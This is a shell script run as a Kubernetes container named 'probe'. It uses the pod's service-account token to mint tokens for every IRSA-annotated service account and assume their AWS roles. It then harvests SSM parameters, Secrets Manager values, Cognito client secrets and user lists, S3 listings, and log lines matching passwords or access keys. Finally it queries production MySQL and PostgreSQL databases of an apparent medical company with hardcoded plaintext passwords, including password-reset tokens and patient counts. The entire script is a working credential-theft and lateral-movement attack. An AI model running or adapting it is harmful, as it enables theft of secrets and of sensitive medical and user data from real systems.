containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
post(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --header="Content-Type: application/json" --post-data="$2" "$1" 2>/dev/null; }
echo "===I2883B_START env=prod utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq gzip mariadb-client postgresql16-client >/tmp/apk.log 2>&1
echo "apk_rc=$? aws=$(command -v aws)"
export AWS_DEFAULT_REGION=us-west-2
get "$API/api/v1/namespaces?limit=1000" | jq -r '.items[]?.metadata.name' | sort > /tmp/ns.txt
: > /tmp/irsa.txt
while read -r n; do
  get "$API/api/v1/namespaces/$n/serviceaccounts?limit=500" | jq -r --arg n "$n" '.items[]? | select(.metadata.annotations["eks.amazonaws.com/role-arn"]!=null) | "\($n)|\(.metadata.name)|\(.metadata.annotations["eks.amazonaws.com/role-arn"])"' >> /tmp/irsa.txt
done < /tmp/ns.txt
sort -u /tmp/irsa.txt > /tmp/irsa2.txt
echo "IRSA_COUNT=$(wc -l < /tmp/irsa2.txt)"

param1(){
  V=$(aws ssm get-parameter --name "$1" --with-decryption --region us-west-2 --query Parameter.Value --output text 2>/tmp/perr.txt)
  if [ $? -eq 0 ]; then echo "P_OK $1 = $V"; else echo "P_NO $1 $(head -c 120 /tmp/perr.txt | tr "\n" " ")"; fi
}

while IFS="|" read -r ns san role; do
  [ -z "${role:-}" ] && continue
  R="$ns/$san"
  echo "===ROLE_BEGIN $R==="
  TK=$(post "$API/api/v1/namespaces/$ns/serviceaccounts/$san/token" '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":3600}}')
  WT=$(echo "$TK" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKEN_FAIL"; continue; }
  RES=$(aws sts assume-role-with-web-identity --role-arn "$role" --role-session-name i2883b --web-identity-token "$WT" --duration-seconds 1800 --region us-west-2 --output json 2>&1)
  echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1 || { echo "ASSUME_FAIL $(echo "$RES" | head -c 200 | tr "\n" " ")"; continue; }
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r '.Credentials.AccessKeyId')
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r '.Credentials.SecretAccessKey')
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r '.Credentials.SessionToken')
  echo "ASSUME_OK $R"
  # by-path first
  for P in /959737396140/prod01 /959737396140/dp/prod01; do
    BP=$(aws ssm get-parameters-by-path --path "$P" --recursive --with-decryption --max-items 100 --region us-west-2 --output json 2>/tmp/bperr.txt)
    if echo "$BP" | jq -e '.Parameters' >/dev/null 2>&1; then
      echo "BYPATH_OK $P n=$(echo "$BP" | jq '.Parameters|length') next=$(echo "$BP" | jq -r '.NextToken // "-"')"
      echo "$BP" | jq -r '.Parameters[]? | "PARAM \(.Name) = \(.Value)"' | head -80
    else
      echo "BYPATH_NO $P $(head -c 120 /tmp/bperr.txt | tr "\n" " ")"
    fi
  done
  # individual candidates
  param1 '/959737396140/prod01/cognito/user_pool_client_id'
  param1 '/959737396140/prod01/cognito/user_pool_client_secret'
  param1 '/959737396140/prod01/cognito/user_pool_id'
  param1 '/959737396140/prod01/cognito/cognito_domain_url'
  param1 '/959737396140/prod01/cognito/super_admin_email'
  param1 '/959737396140/prod01/cognito/super_admin_username'
  param1 '/959737396140/prod01/cognito/super_admin_password'
  param1 '/959737396140/prod01/ses/sender_email'
  param1 '/959737396140/prod01/api-gateway/auth_service/domain'
  param1 '/959737396140/prod01/api-gateway/authorization-url'
  param1 '/959737396140/prod01/api-gateway/parent_domain'
  param1 '/959737396140/prod01/api-gateway/user_management_url'
  param1 '/959737396140/prod01/cloudfront/user_management/alternate_domain_name'
  param1 '/959737396140/prod01/cloudfront/user_management/cloudfront_distribution_url'
  param1 '/959737396140/prod01/cloudfront/user_management_url'
  param1 '/959737396140/prod01/cloudfront/dms_portal/alternate_domain_name'
  param1 '/959737396140/prod01/config/session/inactivity_timeout_minutes'
  param1 '/959737396140/prod01/csp/google-font'
  param1 '/959737396140/prod01/csp/google-font-style'
  param1 '/959737396140/prod01/company_name'
  param1 '/959737396140/prod01/s3/log_bucket'
  param1 '/959737396140/prod01/eks_cluster/cluster_name'
  param1 '/959737396140/dp/prod01/api-gateway/data-management-service-url'
  param1 '/959737396140/dp/prod01/box-ingestion-service/box_developer_token'
  param1 '/959737396140/dp/prod01/cloudfront/cornerstone_viewer_remote_url'
  param1 '/959737396140/dp/prod01/cloudfront/dms_download/cloudfront_distribution_keypair'
  param1 '/959737396140/dp/prod01/cloudfront/dms_download/cloudfront_distribution_url'
  param1 '/959737396140/dp/prod01/cloudfront/imfusion_viewer_remote_url'
  param1 '/959737396140/dp/prod01/cognito/mlflow_group_name'
  param1 '/959737396140/dp/prod01/cognito/mlflow_admin_group_name'
  param1 '/959737396140/dp/prod01/domain/mlflow_server_domain_url'
  param1 '/959737396140/dp/prod01/glue/sort_job_name'
  param1 '/959737396140/dp/prod01/green-bucket-name'
  param1 '/959737396140/dp/prod01/ingestion-bucket-name'
  param1 '/959737396140/dp/prod01/red-bucket-name'
  param1 '/959737396140/dp/prod01/sqs/box_ingestion_queue_url'
  param1 '/959737396140/dp/prod01/sqs/imfusion_queue_name'
  param1 '/959737396140/dp/prod01/sqs/imfusion_user_sync_queue_url'
  param1 '/959737396140/dp/prod01/sqs/s3_ingestion_queue_url'
  param1 '/959737396140/dp/prod01/structure-bucket-name'
  param1 '/959737396140/dp/prod01/temp-dicom-csv-reports-storage-bucket-name'
  param1 '/959737396140/dp/prod01/temp-dicom-frame-storage-bucket-name'
  param1 '/959737396140/dp/prod01/yellow-bucket-name'
  param1 '/959737396140/dp/prod01/pgsql/db_secret_name'
  param1 '/959737396140/dp/prod01/networkloadbalancer/data_management_service/nlb_target_group_arn'
  # secretsmanager targeted
  SV=$(aws secretsmanager get-secret-value --secret-id 'lazamedical-prod01-usw2-mysql-1-db-secret' --region us-west-2 --query SecretString --output text 2>/tmp/sverr.txt)
  if [ $? -eq 0 ]; then echo "SECRET_OK lazamedical-prod01-usw2-mysql-1-db-secret = $SV"; else echo "SECRET_NO lazamedical-prod01-usw2-mysql-1-db-secret $(head -c 100 /tmp/sverr.txt | tr "\n" " ")"; fi
  SV=$(aws secretsmanager get-secret-value --secret-id 'lazamedical-dp-prod01-usw2-postgresql-db-secret' --region us-west-2 --query SecretString --output text 2>/tmp/sverr.txt)
  if [ $? -eq 0 ]; then echo "SECRET_OK lazamedical-dp-prod01-usw2-postgresql-db-secret = $SV"; else echo "SECRET_NO lazamedical-dp-prod01-usw2-postgresql-db-secret $(head -c 100 /tmp/sverr.txt | tr "\n" " ")"; fi
  # cognito targeted
  CP=$(aws cognito-idp describe-user-pool --user-pool-id 'us-west-2_mBdsaN59X' --region us-west-2 --output json 2>/tmp/cperr.txt)
  if echo "$CP" | jq -e '.UserPool' >/dev/null 2>&1; then
    echo "COG_POOL_OK $(echo "$CP" | jq -c '{Name:.UserPool.Name,Id:.UserPool.Id,Est:.UserPool.EstimatedNumberOfUsers,Mfa:.UserPool.MfaConfiguration}')"
    CL=$(aws cognito-idp list-user-pool-clients --user-pool-id 'us-west-2_mBdsaN59X' --max-results 20 --region us-west-2 --output json 2>/dev/null)
    echo "COG_CLIENTS $(echo "$CL" | jq -c '.UserPoolClients' 2>/dev/null)"
    for cid in $(echo "$CL" | jq -r '.UserPoolClients[]? | .ClientId' 2>/dev/null); do
      aws cognito-idp describe-user-pool-client --user-pool-id 'us-west-2_mBdsaN59X' --client-id "$cid" --region us-west-2 --output json 2>/dev/null | jq -c '{ClientName:.UserPoolClient.ClientName,ClientId:.UserPoolClient.ClientId,ClientSecret:.UserPoolClient.ClientSecret,ExplicitAuthFlows:.UserPoolClient.ExplicitAuthFlows,AllowedOAuthFlows:.UserPoolClient.AllowedOAuthFlows,CallbackURLs:.UserPoolClient.CallbackURLs}' 2>/dev/null | head -c 2000
      echo
    done
    LU=$(aws cognito-idp list-users --user-pool-id 'us-west-2_mBdsaN59X' --limit 50 --region us-west-2 --output json 2>/tmp/luerr.txt)
    if echo "$LU" | jq -e '.Users' >/dev/null 2>&1; then
      echo "COG_USERS=$(echo "$LU" | jq '.Users|length')"
      echo "$LU" | jq -r '.Users[]? | "USER \(.Username) enabled=\(.Enabled) status=\(.UserStatus) created=\(.UserCreateDate) attrs=\([.Attributes[]?|select(.Name=="email" or .Name=="email_verified" or .Name=="sub" or (.Name|startswith("custom:")))|"\(.Name)=\(.Value)"]|join(","))"' | head -50
    else
      echo "COG_USERS_NO $(head -c 120 /tmp/luerr.txt | tr "\n" " ")"
    fi
  else
    echo "COG_POOL_NO $(head -c 120 /tmp/cperr.txt | tr "\n" " ")"
  fi
  # s3 targeted
  for B in 'lazamedical-prod01-usw2-log-bucket' 'lazamedical-prod01-usw2-documents'; do
    LO=$(aws s3api list-objects-v2 --bucket "$B" --max-keys 50 --region us-west-2 --output json 2>/tmp/loerr.txt)
    if echo "$LO" | jq -e '.Contents' >/dev/null 2>&1; then
      echo "S3_OK $B n=$(echo "$LO" | jq '.Contents|length')"
      echo "$LO" | jq -r '.Contents[] | "OBJ \(.Key)|\(.Size)"' | head -50
    else
      echo "S3_NO $B $(head -c 120 /tmp/loerr.txt | tr "\n" " ")"
    fi
  done
  # logs targeted
  for G in /aws/eks/lazamedical-prod01-usw2-cluster/cluster; do
    OUT=$(aws logs filter-log-events --log-group-name "$G" --start-time $(( ($(date +%s) - 604800) * 1000 )) --filter-pattern "?password ?secret ?token ?AKIA" --limit 30 --region us-west-2 --output json 2>/tmp/lferr.txt)
    if echo "$OUT" | jq -e '.events' >/dev/null 2>&1; then
      echo "LOGS_OK $G n=$(echo "$OUT" | jq '.events|length')"
      echo "$OUT" | jq -r '.events[]? | "EVT \(.timestamp) \(.message)"' | head -c 8000
      echo
    else
      echo "LOGS_NO $G $(head -c 120 /tmp/lferr.txt | tr "\n" " ")"
    fi
  done
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
  echo "===ROLE_END $R==="
done < /tmp/irsa2.txt

echo "===DB_MYSQL_BEGIN==="
export MYSQL_PWD='+#`jmw!z|3PyO^;X#21*]Vik(HA?#2Mv'
MH='lazamedical-prod01-usw2-mysql-rds1.clg4mimw6718.us-west-2.rds.amazonaws.com'
q(){ mysql --connect-timeout=10 -h "$MH" -P 3306 -u admin -D user_management -N -e "$1" 2>&1; }
echo "COUNTS $(q "SELECT CONCAT('account=',(SELECT COUNT(*) FROM account),' user=',(SELECT COUNT(*) FROM user),' role=',(SELECT COUNT(*) FROM role),' user_role=',(SELECT COUNT(*) FROM user_role_link),' prt=',(SELECT COUNT(*) FROM password_reset_token),' prt_unused=',(SELECT COUNT(*) FROM password_reset_token WHERE used=0),' settings=',(SELECT COUNT(*) FROM settings),' module=',(SELECT COUNT(*) FROM module),' component=',(SELECT COUNT(*) FROM component),' email_template=',(SELECT COUNT(*) FROM email_template),' dpps=',(SELECT COUNT(*) FROM data_processing_status))")
echo "---SETTINGS_SCHEMA"; q "SHOW COLUMNS FROM settings" | tr "\n" " "; echo
echo "---SETTINGS_ROWS"; q "SELECT * FROM settings LIMIT 10" | head -c 4000; echo
echo "---ROLE"; q "SELECT * FROM role LIMIT 20" | head -c 3000; echo
echo "---USER_ROLE"; q "SELECT * FROM user_role_link LIMIT 20" | head -c 3000; echo
echo "---PRT_SCHEMA"; q "SHOW COLUMNS FROM password_reset_token" | tr "\n" " "; echo
echo "---PRT_UNUSED"; q "SELECT id,identifier,user_id,LEFT(token_hash,10),used,created_at FROM password_reset_token WHERE used=0 ORDER BY id DESC LIMIT 20" | tr "\n" " "; echo
echo "---PRT_LAST3"; q "SELECT id,identifier,user_id,LEFT(token_hash,10),used,created_at FROM password_reset_token ORDER BY id DESC LIMIT 3" | tr "\n" " "; echo
echo "---ACCOUNT_COLS"; q "SHOW COLUMNS FROM account" | tr "\n" " "; echo
echo "---ACCOUNT_SAMPLE"; q "SELECT id,UPPER(LEFT(name,1)) as n,status,created_at FROM account ORDER BY id DESC LIMIT 5" 2>&1 | tr "\n" " "; echo
echo "---DPPS"; q "SELECT * FROM data_processing_status LIMIT 30" | head -c 2000; echo
echo "---PHI_RULE"; q "SELECT * FROM phi_security_rule_config LIMIT 10" | head -c 1500; echo
echo "---EMAIL_TEMPLATE_COLS"; q "SHOW COLUMNS FROM email_template" | tr "\n" " "; echo
echo "---EMAIL_TEMPLATE_1"; q "SELECT id,name,LEFT(body,120) FROM email_template LIMIT 5" 2>&1 | head -c 1500; echo
unset MYSQL_PWD
echo "===DB_MYSQL_END==="
echo "===DB_PG_BEGIN==="
export PGPASSWORD='O7-=&m^RCS^wO~G97;tgAq|8gj|3=`Kj'
PH='lazamedical-dp-prod01-usw2-postgresql-rds.clg4mimw6718.us-west-2.rds.amazonaws.com'
pq(){ psql -h "$PH" -p 5432 -U postgres_admin -d dp_service -At -c "$1" 2>&1; }
echo "---PROJECT_CONFIG"; pq "select * from public.project_config limit 10" | head -c 3000; echo
echo "---FILTER_CONFIG"; pq "select * from public.filter_config limit 20" | head -c 3000; echo
echo "---DISPLAY_COLUMN"; pq "select * from public.display_column_config limit 20" | head -c 2000; echo
echo "---USER_PREF"; pq "select count(*) from public.user_preference" ; echo
echo "---COUNTS"; pq "select (select count(*) from public.project) as projects, (select count(*) from public.data_file) as files, (select count(*) from public.patient) as patients, (select count(*) from public.contact) as contacts" ; echo
echo "---DATASOURCE"; pq "select * from public.datasource limit 10" | head -c 2000; echo
unset PGPASSWORD
echo "===DB_PG_END==="
echo "===I2883B_DONE $(date -u +%FT%TZ)==="
